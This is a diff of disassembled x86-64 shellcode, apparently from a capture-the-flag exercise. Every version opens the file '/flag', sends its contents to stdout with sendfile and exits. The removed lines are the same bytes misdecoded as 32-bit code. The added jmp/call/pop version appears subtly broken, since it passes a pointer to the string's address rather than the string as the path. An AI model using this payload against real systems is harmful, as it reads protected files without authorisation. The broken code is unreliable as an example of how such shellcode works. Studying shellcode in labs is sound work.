@@ -1,26 +1,20 @@
-   0:   48                      dec    eax
-   1:   31 c0                   xor    eax, eax
-   3:   48                      dec    eax
-   4:   bb 2f 66 6c 61          mov    ebx, 0x616c662f
-   9:   67 00 00                add    BYTE PTR [bx+si], al
-   c:   00 53 48                add    BYTE PTR [ebx+0x48], dl
-   f:   c7 c0 02 00 00 00       mov    eax, 0x2
-  15:   48                      dec    eax
-  16:   89 e7                   mov    edi, esp
-  18:   48                      dec    eax
-  19:   c7 c6 00 00 00 00       mov    esi, 0x0
-  1f:   0f 05                   syscall 
-  21:   48                      dec    eax
-  22:   c7 c7 01 00 00 00       mov    edi, 0x1
-  28:   48                      dec    eax
-  29:   89 c6                   mov    esi, eax
-  2b:   48                      dec    eax
-  2c:   c7 c2 00 00 00 00       mov    edx, 0x0
-  32:   49                      dec    ecx
-  33:   c7 c2 e8 03 00 00       mov    edx, 0x3e8
-  39:   48                      dec    eax
-  3a:   c7 c0 28 00 00 00       mov    eax, 0x28
-  40:   0f 05                   syscall 
-  42:   48                      dec    eax
-  43:   c7 c0 3c 00 00 00       mov    eax, 0x3c
-  49:   0f 05                   syscall
+   0:   eb 3f                   jmp    0x41
+   2:   59                      pop    rcx
+   3:   51                      push   rcx
+   4:   48 c7 c0 02 00 00 00    mov    rax, 0x2
+   b:   48 89 e7                mov    rdi, rsp
+   e:   48 c7 c6 00 00 00 00    mov    rsi, 0x0
+  15:   0f 05                   syscall 
+  17:   48 c7 c7 01 00 00 00    mov    rdi, 0x1
+  1e:   48 89 c6                mov    rsi, rax
+  21:   48 c7 c2 00 00 00 00    mov    rdx, 0x0
+  28:   49 c7 c2 e8 03 00 00    mov    r10, 0x3e8
+  2f:   48 c7 c0 28 00 00 00    mov    rax, 0x28
+  36:   0f 05                   syscall 
+  38:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
+  3f:   0f 05                   syscall 
+  41:   e8 bc ff ff ff          call   0x2
+  46:   2f                      (bad)  
+  47:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
+  49:   61                      (bad)  
+  4a:   67                      addr32
